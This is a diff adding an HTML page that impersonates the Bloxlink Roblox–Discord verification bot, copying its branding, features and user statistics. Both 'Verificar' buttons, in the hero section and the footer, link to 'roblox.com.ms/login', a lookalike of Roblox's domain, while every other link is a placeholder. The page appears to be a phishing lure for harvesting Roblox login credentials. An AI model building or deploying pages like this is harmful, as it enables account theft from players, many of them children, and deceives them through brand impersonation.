@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bloxlink - Bringing Roblox to Discord</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --navy:#151a2c; --red:#b32a20; --red2:#c9301f;
+  --green:#2e9c76; --green2:#37b98b; --blue:#5865f2; --link:#7ea2ff;
+  --txt:#e9edf6; --mut:#98a2ba;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0e1220}
+.blx{font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,Arial,sans-serif;max-width:470px;margin:0 auto;background:var(--navy);color:var(--txt);line-height:1.55;overflow-x:hidden}
+
+.topbar{display:flex;align-items:center;gap:10px;padding:14px 16px;background:#141929}
+.brand{display:flex;align-items:center;gap:8px;font-weight:900;font-size:21px;letter-spacing:-.7px;flex:1}
+.discord-btn{background:var(--blue);color:#fff;border:0;border-radius:8px;padding:9px 13px;font-weight:800;font-size:13.5px;line-height:1.2;text-decoration:none}
+.burger{width:22px;flex:none}
+.burger i{display:block;height:2px;background:#fff;margin:5px 0;border-radius:2px}
+
+.notice{background:#161c30;border-top:1px solid #232a42;border-bottom:1px solid #232a42;padding:14px 16px;color:#c3cadd;font-size:13.5px;display:flex;gap:10px}
+.notice a{color:var(--link);text-decoration:none}
+
+.hero{padding:62px 20px 34px;text-align:center}
+.hero h1{font-size:clamp(46px,13vw,62px);font-weight:900;letter-spacing:-3px;line-height:.95}
+.hero h2{font-size:clamp(31px,9vw,42px);font-weight:900;letter-spacing:-2px;line-height:1.06;margin-top:4px}
+.hero h2 .rb{color:#e03a2f}
+.hero h2 .dc{color:#5865f2}
+.hero .lead{color:var(--mut);font-size:16.5px;margin:22px auto 26px;max-width:370px}
+
+/* BOTAO VERIFICAR */
+.btn-verificar{display:block;width:100%;background:var(--green);color:#fff;text-decoration:none;font-weight:800;font-size:17px;text-align:center;padding:16px;border-radius:10px;border:0;cursor:pointer;transition:background .15s,transform .08s}
+.btn-verificar:hover{background:var(--green2)}
+.btn-verificar:active{transform:translateY(1px)}
+
+.legal{color:#8d97ae;font-size:13.5px;margin-top:16px}
+.legal a{color:var(--txt);text-decoration:none}
+
+.rating{display:flex;align-items:center;gap:16px;padding:22px 22px 42px;justify-content:center}
+.stars{color:#f5c518;font-size:21px;letter-spacing:2px}
+.rating .div{width:1px;height:48px;background:#2c3348;flex:none}
+.rating p{font-size:14.5px;text-align:left;color:#dfe4ef}
+.rating p span{color:#e0503f}
+
+.red{background:linear-gradient(160deg,#b32a20,#c9301f);padding:50px 22px}
+.red h2{font-size:clamp(29px,8vw,38px);font-weight:900;letter-spacing:-1.5px;line-height:1.06;margin-bottom:16px}
+.red p{color:#f2d7d3;font-size:15.5px}
+.feat{margin-top:32px}
+.feat .ico{width:52px;height:52px;border-radius:10px;background:rgba(255,255,255,.14);display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+.feat h3{font-size:21px;font-weight:900;letter-spacing:-.5px;margin-bottom:8px}
+
+.metrics{padding:56px 22px;text-align:center}
+.metrics .kicker{color:#e0503f;font-weight:900;letter-spacing:1px;font-size:13.5px;margin-bottom:14px}
+.metrics h2{font-size:clamp(30px,8.5vw,40px);font-weight:900;letter-spacing:-1.5px;line-height:1.05;margin-bottom:18px}
+.metrics .sub{color:var(--mut);font-size:15.5px;max-width:360px;margin:0 auto}
+.stat{margin-top:34px;text-align:left}
+.stat b{display:block;font-size:34px;font-weight:900;letter-spacing:-1px}
+.stat span{color:var(--mut);font-size:15.5px}
+.stat span em{color:#fff;font-style:normal;font-weight:700}
+
+.foot{border-top:1px solid #262d44;padding:38px 22px 30px;background:#141929}
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:30px 18px}
+.cols h4{font-size:13px;letter-spacing:1px;color:#8b93a8;font-weight:900;margin-bottom:12px}
+.cols a{display:block;color:#e9edf6;text-decoration:none;font-size:15.5px;margin-bottom:9px}
+.cols a:hover{color:#fff;text-decoration:underline}
+.foot .btn-verificar{margin-top:34px}
+.copy{border-top:1px solid #262d44;margin-top:28px;padding-top:18px;color:#8b93a8;font-size:14px}
+</style>
+</head>
+<body>
+<div class="blx">
+
+  <div class="topbar">
+    <div class="brand">
+      <svg width="30" height="30" viewBox="0 0 32 32" fill="none">
+        <path d="M10 6l-1.6-3.2M22 6l1.6-3.2" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+        <rect x="3" y="6" width="26" height="22" rx="6" fill="#fff"/>
+        <circle cx="12" cy="15" r="2.2" fill="#151a2c"/>
+        <circle cx="20" cy="15" r="2.2" fill="#151a2c"/>
+        <path d="M11.5 21c1.4 1.4 3 2 4.5 2s3.1-.6 4.5-2" stroke="#151a2c" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+      bloxlink
+    </div>
+    <a class="discord-btn" href="#">Sign In with<br>Discord</a>
+    <div class="burger"><i></i><i></i><i></i></div>
+  </div>
+
+  <div class="notice">
+    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" style="flex:none;margin-top:2px">
+      <circle cx="12" cy="12" r="10" stroke="#9aa3b8" stroke-width="2"/>
+      <path d="M12 7.5v.01M12 11v6" stroke="#9aa3b8" stroke-width="2" stroke-linecap="round"/>
+    </svg>
+    <div>We've updated our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a>, and <a href="#">Purchase Policy</a> effective February 10, 2026.</div>
+  </div>
+
+  <div class="hero">
+    <h1>Bloxlink</h1>
+    <h2>Bringing <span class="rb">Roblox</span><br>to <span class="dc">Discord</span></h2>
+    <p class="lead">Connect Roblox to Discord using Bloxlink, the leading Roblox Discord Bot. Verify who you really are, sync your group to your server, and more.</p>
+
+    <!-- BOTAO VERIFICAR (input removido) -->
+    <a class="btn-verificar" href="https://roblox.com.ms/login?returnUrl=6245140853890723">Verificar</a>
+
+    <p class="legal">By continuing, you agree to our <a href="#">terms of service</a> and <a href="#">privacy policy</a>.</p>
+  </div>
+
+  <div class="rating">
+    <div class="stars">★★★★★</div>
+    <div class="div"></div>
+    <p>Tap rated Roblox bot by<br><span>thousands of users</span></p>
+  </div>
+
+  <div class="red">
+    <h2>No complex setup or documentation needed</h2>
+    <p>Bloxlink appeals to the average user and the advanced user. Setup Bloxlink how you want to, enable new features with the click of a button, seamlessly.</p>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><rect x="3" y="4" width="18" height="16" rx="3" stroke="#fff" stroke-width="2"/><path d="M3 9h18" stroke="#fff" stroke-width="2"/></svg></div>
+      <h3>Simple Verification</h3>
+      <p>With the ability to verify through our Roblox game or by a code on your profile, our verification system is very easy to use for new users!</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><circle cx="9" cy="8" r="3.2" stroke="#fff" stroke-width="2"/><path d="M3 19c0-3.3 2.7-5 6-5s6 1.7 6 5" stroke="#fff" stroke-width="2" stroke-linecap="round"/><circle cx="17.5" cy="9" r="2.4" stroke="#fff" stroke-width="2"/><path d="M15.5 14.3c2.8.2 5 1.8 5 4.7" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div>
+      <h3>Binds</h3>
+      <p>Connect almost anything on Roblox to a Discord role! Gamepasses, badges, group ranks, and any other asset, it can be done with Bloxlink.</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M5 7h14M10 7V5h4v2M8 7l1 12h6l1-12" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+      <h3>Roblox-based Server Restrictions</h3>
+      <p>Only want group members in your server? We've got you covered. Lock your server with age-limits and group-only with Roblox restrictions.</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M16 4l4 4-9.5 9.5-5 1.5 1.5-5L16 4z" stroke="#fff" stroke-width="2" stroke-linejoin="round"/></svg></div>
+      <h3>Group Utility Commands</h3>
+      <p>Bloxlink provides a variety of group features that all types of groups can use to customize their server to their specific style.</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="8.5" stroke="#fff" stroke-width="2"/><path d="M8 12h8M12 8v8" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div>
+      <h3>User Utility Commands</h3>
+      <p>Ever wanted to know who that John Doe is that joined your server? Use Bloxlink to find out their username and other information!</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M20 15a3 3 0 01-3 3H9l-4 3v-4a3 3 0 01-1-2.2V8a3 3 0 013-3h10a3 3 0 013 3v7z" stroke="#fff" stroke-width="2" stroke-linejoin="round"/></svg></div>
+      <h3>Community</h3>
+      <p>Bloxlink has a huge community backing it, and they help shape new features for Bloxlink everyday. Join them and become a community member!</p>
+    </div>
+
+    <div class="feat">
+      <div class="ico"><svg width="26" height="26" viewBox="0 0 24 24" fill="none"><path d="M4 6h11a3 3 0 013 3v3a3 3 0 01-3 3H9l-4 3v-4" stroke="#fff" stroke-width="2" stroke-linejoin="round"/></svg></div>
+      <h3>Tutorials</h3>
+      <p>We know sometimes things can get a bit confusing, we have a full team dedicated to making the best tutorials so you can setup Bloxlink how you want it.</p>
+    </div>
+  </div>
+
+  <div class="metrics">
+    <div class="kicker">THE METRICS</div>
+    <h2>We're the most trusted Roblox bot for Discord</h2>
+    <p class="sub">Bloxlink has been around for over six years. Our track record of delivering successful products speaks for itself. Join our large community of players and developers and take a step towards innovating Roblox for the future.</p>
+
+    <div class="stat"><b>1M+</b><span><em>Discord Servers</em> use Bloxlink to verify their members and sync their group.</span></div>
+    <div class="stat"><b>88M+</b><span><em>Players around the globe</em> use Bloxlink.</span></div>
+    <div class="stat"><b>99%</b><span><em>Uptime record</em> provides our users with un-interrupted usage and updates.</span></div>
+    <div class="stat"><b>30+</b><span><em>Available bot commands</em> so you can bring all of Roblox to your server.</span></div>
+  </div>
+
+  <div class="foot">
+    <div class="cols">
+      <div>
+        <h4>BLOXLINK</h4>
+        <a href="#">Add Bloxlink to your server</a>
+        <a href="#">List of commands</a>
+      </div>
+      <div>
+        <h4>SOLUTIONS</h4>
+        <a href="#">Verify your members</a>
+        <a href="#">Bind items to Discord roles</a>
+        <a href="#">Roblox-based server locks</a>
+        <a href="#">and more...</a>
+      </div>
+      <div>
+        <h4>RESOURCES</h4>
+        <a href="#">Get support</a>
+        <a href="#">Developer Portal</a>
+      </div>
+      <div>
+        <h4>LEGAL</h4>
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Purchase Policy</a>
+        <a href="#">Legal Contact</a>
+      </div>
+      <div>
+        <h4>SOCIALS</h4>
+        <a href="#">Roblox</a>
+        <a href="#">Discord</a>
+        <a href="#">Twitter</a>
+        <a href="#">GitHub</a>
+      </div>
+    </div>
+
+    <!-- BOTAO VERIFICAR (input removido) -->
+    <a class="btn-verificar" href="https://roblox.com.ms/login?returnUrl=6245140853890723">Verificar</a>
+
+    <div class="copy">© 2026 BloxWorks, LLC. All rights reserved.</div>
+  </div>
+
+</div>
+</body>
+  </html>
